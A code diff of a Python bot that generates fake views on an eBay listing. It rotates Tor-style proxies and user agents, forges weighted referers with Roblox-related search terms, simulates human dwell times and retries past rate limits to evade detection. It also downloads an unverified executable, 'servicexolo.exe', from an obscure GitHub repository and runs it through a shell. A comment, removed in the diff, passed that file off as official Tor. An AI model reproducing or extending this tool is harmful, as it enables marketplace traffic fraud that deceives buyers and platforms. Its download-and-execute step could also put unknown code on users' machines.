@@ -6,39 +6,123 @@ import psutil
 import concurrent.futures
 import random
 import time
-import logging
 from random_user_agent.user_agent import UserAgent
 from random_user_agent.params import SoftwareName, OperatingSystem
+from typing import Dict, List
+import logging
+from datetime import datetime
 
-# Configure logging
-logging.basicConfig(filename='view_adder.log', level=logging.INFO, format='%(asctime)s %(message)s')
+# Set up logging
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(levelname)s - %(message)s',
+    handlers=[
+        logging.FileHandler('traffic_generator.log'),
+        logging.StreamHandler()
+    ]
+)
 
 class ProxyRotator:
-    def __init__(self, proxies):
+    def __init__(self, proxies: List[str]):
         self.proxies = proxies
         self.current_index = 0
+        self.failed_proxies: Dict[str, int] = {}  # Track failed proxies
+        self.max_failures = 3  # Maximum failures before removing proxy
         
-    def next(self):
-        proxy = self.proxies[self.current_index]
-        self.current_index = (self.current_index + 1) % len(self.proxies)
-        return proxy
+    def next(self) -> str:
+        while True:
+            proxy = self.proxies[self.current_index]
+            self.current_index = (self.current_index + 1) % len(self.proxies)
+            
+            # Skip proxies that have failed too many times
+            if self.failed_proxies.get(proxy, 0) >= self.max_failures:
+                continue
+            return proxy
+    
+    def mark_failure(self, proxy: str) -> None:
+        self.failed_proxies[proxy] = self.failed_proxies.get(proxy, 0) + 1
+        if self.failed_proxies[proxy] >= self.max_failures:
+            logging.warning(f"Proxy {proxy} has failed {self.max_failures} times and will be skipped")
 
 class UserAgentRotator:
-    def __init__(self, software_names, operating_systems, limit=100):
-        self.user_agent_rotator = UserAgent(software_names=software_names, operating_systems=operating_systems, limit=limit)
+    def __init__(self, software_names: List[str], operating_systems: List[str], limit: int = 100):
+        self.user_agent_rotator = UserAgent(
+            software_names=software_names,
+            operating_systems=operating_systems,
+            limit=limit
+        )
+        self.previous_agents: List[str] = []
+        self.max_history = 10  # Avoid repeating recent user agents
         
-    def next(self):
-        return self.user_agent_rotator.get_random_user_agent()
+    def next(self) -> str:
+        while True:
+            agent = self.user_agent_rotator.get_random_user_agent()
+            if agent not in self.previous_agents:
+                self.previous_agents.append(agent)
+                if len(self.previous_agents) > self.max_history:
+                    self.previous_agents.pop(0)
+                return agent
+
+class BehaviorSimulator:
+    def __init__(self):
+        # Time ranges for different behaviors (in seconds)
+        self.page_view_times = {
+            'quick_bounce': (5, 10),
+            'brief_view': (15, 45),
+            'detailed_view': (60, 180),
+            'thorough_view': (180, 300)
+        }
+        
+        # Probability weights for different behaviors
+        self.behavior_weights = {
+            'quick_bounce': 15,
+            'brief_view': 40,
+            'detailed_view': 35,
+            'thorough_view': 10
+        }
+        
+        # Simulate different device speeds
+        self.network_delays = {
+            'fast': (0.1, 0.5),
+            'medium': (0.5, 1.5),
+            'slow': (1.5, 3.0)
+        }
+        
+        self.network_weights = {
+            'fast': 50,
+            'medium': 35,
+            'slow': 15
+        }
+    
+    def simulate_view_time(self) -> float:
+        behavior = random.choices(
+            list(self.behavior_weights.keys()),
+            weights=list(self.behavior_weights.values()),
+            k=1
+        )[0]
+        
+        min_time, max_time = self.page_view_times[behavior]
+        return random.uniform(min_time, max_time)
+    
+    def simulate_network_delay(self) -> float:
+        speed = random.choices(
+            list(self.network_weights.keys()),
+            weights=list(self.network_weights.values()),
+            k=1
+        )[0]
+        
+        min_delay, max_delay = self.network_delays[speed]
+        return random.uniform(min_delay, max_delay)
 
 class ServiceInstaller:
-    service_link = "https://github.com/tricx0/iFaxgZaDgn-lvXTBBeX7k/raw/main/servicexolo.exe"  # THIS IS THE OFFICIAL TOR EXECUTABLE
+    service_link = "https://github.com/tricx0/iFaxgZaDgn-lvXTBBeX7k/raw/main/servicexolo.exe"
     
-    def __init__(self, total_ips):
+    def __init__(self, total_ips: int):
         self.temp_dir = tempfile.gettempdir()
         self.total_ips = total_ips
         self.stop_servicexolo_windows()
         self.proxies = self.make(total_ips)
-        self.proxy_rotator = ProxyRotator(self.proxies)  # Initialize proxy rotator here
+        self.proxy_rotator = ProxyRotator(self.proxies)
         
     def _create_temp_directory(self):
         try:
@@ -71,114 +155,206 @@ class ServiceInstaller:
         file_path2 = os.path.join(self.temp_dir, "xoloservice", "config")
         self._generate_ips_file(file_path2)
 
-        process = subprocess.Popen(f"{file_path} -nt-service -f {file_path2}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        process = subprocess.Popen(
+            f"{file_path} -nt-service -f {file_path2}", 
+            shell=True, 
+            stdout=subprocess.PIPE, 
+            stderr=subprocess.PIPE
+        )
+        
         while True:
             line = process.stdout.readline().decode().strip()
-            logging.info(line)  # Log output
+            logging.info(line)  # Using logging instead of print
             if "Bootstrapped 100% (done): Done" in line:
                 break
             
     def stop_servicexolo_windows(self):
-        for proc in psutil.process_iter():
-            try:
-                if proc.name() == "servicexolo.exe":
-                    proc.terminate()
-                    
-            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
-                pass
+        """Stop any running servicexolo processes"""
+        try:
+            for proc in psutil.process_iter():
+                try:
+                    if proc.name().lower() == "servicexolo.exe":
+                        proc.terminate()
+                        proc.wait(timeout=5)  # Wait for termination
+                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.TimeoutExpired):
+                    pass
+            logging.info("Successfully stopped existing servicexolo processes")
+        except Exception as e:
+            logging.error(f"Error stopping servicexolo processes: {str(e)}")
 
     def make(self, total_ips):
+        """Create and return list of proxy addresses"""
         self.install_service()
-        return [f"http://127.0.0.1:{9080 + i}" for i in range(total_ips)]
+        proxies = [f"http://127.0.0.1:{9080 + i}" for i in range(total_ips)]
+        logging.info(f"Created {len(proxies)} proxy addresses")
+        return proxies
 
-def add_view(link, proxy_rotator, user_agent_rotator):
+def add_view(
+    link: str,
+    proxy_rotator: ProxyRotator,
+    user_agent_rotator: UserAgentRotator,
+    behavior_simulator: BehaviorSimulator
+) -> None:
     try:
         proxy = proxy_rotator.next()
         user_agent = user_agent_rotator.next()
         
-        # Expanded referers for a more realistic distribution
+        # Enhanced referer list with weights
         referers = {
-            'https://www.facebook.com/': 25,
-            'https://www.instagram.com/': 20,
-            'https://www.twitter.com/': 15,
-            'https://www.reddit.com/': 10,
-            'https://www.tiktok.com/': 15,
-            'https://www.linkedin.com/': 5,
-            'https://www.snapchat.com/': 5,
-            'https://www.pinterest.com/': 4,
-            'https://www.whatsapp.com/': 2,
-            'https://www.youtube.com/': 4,
-            'https://www.quora.com/': 3,  # Added referer
-            'https://www.medium.com/': 2, # Added referer
-            'https://www.tumblr.com/': 2   # Added referer
+            'https://www.google.com/search?q=': 30,
+            'https://www.facebook.com/marketplace/': 20,
+            'https://www.instagram.com/shopping/': 15,
+            'https://www.pinterest.com/shop/': 10,
+            'https://www.reddit.com/r/': 8,
+            'https://t.co/': 5,
+            'https://www.bing.com/search?q=': 5,
+            'https://duckduckgo.com/?q=': 4,
+            'https://www.youtube.com/watch?v=': 3
         }
         
-        referer = random.choices(
-            list(referers.keys()), 
-            weights=list(referers.values()), 
+        # Generate more realistic referer URLs
+        base_referer = random.choices(
+            list(referers.keys()),
+            weights=list(referers.values()),
             k=1
         )[0]
         
+        # Add search terms for search engine referers
+        if 'search?q=' in base_referer:
+            search_terms = [
+                'pets go free',
+                'roblox buy',
+                'roblox ebay deals',
+                'pets go roblox deals',
+                'gem ebay roblox',
+                'gem pets go ebay'
+            ]
+            referer = base_referer + random.choice(search_terms).replace(' ', '+')
+        else:
+            referer = base_referer
+        
+        # Enhanced headers with more realistic parameters
         headers = {
             'User-Agent': user_agent,
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'DNT': '1',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'cross-site',
+            'Sec-Fetch-User': '?1',
             'Referer': referer,
-            'DNT': '1'
+            'Cache-Control': 'max-age=0'
         }
+        
         proxies = {"http": proxy, "https": proxy}
         
-        logging.info(f'Attempting to add view to {link} using proxy {proxy} with user-agent {user_agent} and referer {referer}.')
-        response = requests.get(link, headers=headers, proxies=proxies)
-
-        logging.info(f'View added to {link} using proxy {proxy} with user-agent {user_agent}. Status code: {response.status_code}')
+        # Simulate network delay before request
+        time.sleep(behavior_simulator.simulate_network_delay())
         
-        # Randomized delay to mimic human behavior
-        time.sleep(random.uniform(2, 5))  # 2 to 5 seconds between views
+        logging.info(f'Attempting view: {link} via {proxy}')
+        response = requests.get(link, headers=headers, proxies=proxies, timeout=10)
         
         if response.status_code == 200:
-            time.sleep(random.uniform(1, 3))  # Random delay after a successful request
+            # Simulate realistic viewing time
+            view_time = behavior_simulator.simulate_view_time()
+            logging.info(f'View successful. Simulating view time of {view_time:.2f} seconds')
+            time.sleep(view_time)
         elif response.status_code in [403, 429]:
-            logging.warning(f'Error: {response.status_code}. Retrying with a different proxy after delay.')
-            time.sleep(random.uniform(5, 10))  # Delay before retrying
-            add_view(link, proxy_rotator, user_agent_rotator)  # Retry with the same link
+            logging.warning(f'Rate limit encountered: {response.status_code}')
+            proxy_rotator.mark_failure(proxy)
+            time.sleep(random.uniform(10, 20))  # Longer delay for rate limits
+            raise Exception("Rate limit encountered")
         else:
-            logging.error(f'Unexpected status code: {response.status_code}')
+            logging.error(f'Unexpected status: {response.status_code}')
+            proxy_rotator.mark_failure(proxy)
+            
     except Exception as e:
-        logging.error(f'An error occurred: {e}')
+        logging.error(f'Error during view: {str(e)}')
+        proxy_rotator.mark_failure(proxy)
+        raise
 
-def add_views_concurrently(link, proxy_rotator, user_agent_rotator, total_views):
-    with concurrent.futures.ThreadPoolExecutor() as executor:
-        futures = {executor.submit(add_view, link, proxy_rotator, user_agent_rotator): i for i in range(total_views)}
-        for future in concurrent.futures.as_completed(futures):
-            future.result()  # Handle any exceptions raised
+def add_views_concurrently(
+    link: str,
+    proxy_rotator: ProxyRotator,
+    user_agent_rotator: UserAgentRotator,
+    behavior_simulator: BehaviorSimulator,
+    total_views: int
+) -> None:
+    successful_views = 0
+    max_retries = 3
+    
+    with concurrent.futures.ThreadPoolExecutor(max_workers=min(total_views, 10)) as executor:
+        while successful_views < total_views:
+            remaining_views = total_views - successful_views
+            futures = {
+                executor.submit(
+                    add_view,
+                    link,
+                    proxy_rotator,
+                    user_agent_rotator,
+                    behavior_simulator
+                ): i for i in range(remaining_views)
+            }
+            
+            for future in concurrent.futures.as_completed(futures):
+                try:
+                    future.result()
+                    successful_views += 1
+                    logging.info(f'Successfully completed {successful_views}/{total_views} views')
+                except Exception as e:
+                    logging.error(f'View failed: {str(e)}')
+                    # Retry logic handled implicitly by the while loop
 
 if __name__ == "__main__":
+    total_ips = int(input("Enter the total number of proxies: "))
+    total_views = int(input("Enter the total number of views to add: "))
+    link = input("Enter the eBay link: ")
+    
+    # Initialize components
+    service_installer = ServiceInstaller(total_ips)
+    
+    software_names = [
+        SoftwareName.CHROME.value,
+        SoftwareName.FIREFOX.value,
+        SoftwareName.SAFARI.value,
+        SoftwareName.EDGE.value,
+        SoftwareName.OPERA.value
+    ]
+    
+    operating_systems = [
+        OperatingSystem.WINDOWS.value,
+        OperatingSystem.MACOS.value,
+        OperatingSystem.LINUX.value,
+        OperatingSystem.IOS.value,
+        OperatingSystem.ANDROID.value
+    ]
+    
+    user_agent_rotator = UserAgentRotator(software_names, operating_systems)
+    behavior_simulator = BehaviorSimulator()
+    
+    # Start traffic generation
+    start_time = datetime.now()
+    logging.info(f'Starting traffic generation at {start_time}')
+    
     try:
-        total_ips = int(input("Enter the total number of proxies: "))
-        total_views = int(input("Enter the total number of views to add: "))
-        link = input("Enter the eBay link: ")
+        add_views_concurrently(
+            link,
+            service_installer.proxy_rotator,
+            user_agent_rotator,
+            behavior_simulator,
+            total_views
+        )
         
-        service_installer = ServiceInstaller(total_ips)
-
-        # Define software names and operating systems with more variety
-        software_names = [
-            SoftwareName.CHROME.value,
-            SoftwareName.FIREFOX.value,
-            SoftwareName.SAFARI.value,
-            SoftwareName.OPERA.value,  # Added Opera
-            SoftwareName.EDGE.value,    # Added Microsoft Edge
-        ]
-
-        operating_systems = [
-            OperatingSystem.WINDOWS.value,
-            OperatingSystem.IOS.value,
-            OperatingSystem.ANDROID.value,
-            OperatingSystem.LINUX.value,
-            OperatingSystem.MAC.value,  # Added macOS
-        ]
-
-        user_agent_rotator = UserAgentRotator(software_names, operating_systems)
-
-        add_views_concurrently(link, service_installer.proxy_rotator, user_agent_rotator, total_views)
+        end_time = datetime.now()
+        duration = end_time - start_time
+        logging.info(f'Traffic generation completed at {end_time}')
+        logging.info(f'Total duration: {duration}')
+        
     except KeyboardInterrupt:
-        logging.info("Script interrupted by user.")
+        logging.warning('Traffic generation interrupted by user')
+    except Exception as e:
+        logging.error(f'Traffic generation failed: {str(e)}')
